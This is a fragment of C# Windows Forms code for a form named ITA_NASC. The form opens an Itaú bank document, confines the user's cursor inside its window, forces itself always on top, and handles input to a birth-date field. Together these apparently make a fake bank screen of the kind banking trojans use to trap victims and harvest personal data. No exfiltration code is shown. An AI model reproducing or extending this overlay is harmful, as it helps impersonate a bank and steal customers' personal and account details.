...
{
    public partial class ITA_NASC : Form
    {
        public ITA_NASC()
        {
            InitializeComponent();
        ...
        {
            Process.Start("https://www.itau.com.br/_arquivosestaticos/Itau/PDF/para-voce/conta-corrente/recarga_pre_pago.pdf");
        }
        ...
        private void ITA_NASC_MouseEnter(object sender, EventArgs e)
        {
            Cursor.Clip = this.Bounds;
        }

        private void ITA_NASC_Load(object sender, EventArgs e)
        {
            SetWindowPos(this.Handle, HWND_TOPMOST, 0, 0, 0, 0, TOPMOST_FLAGS);
        }

        private void dataNasc_KeyPress(object sender, KeyPressEventArgs e)
        {
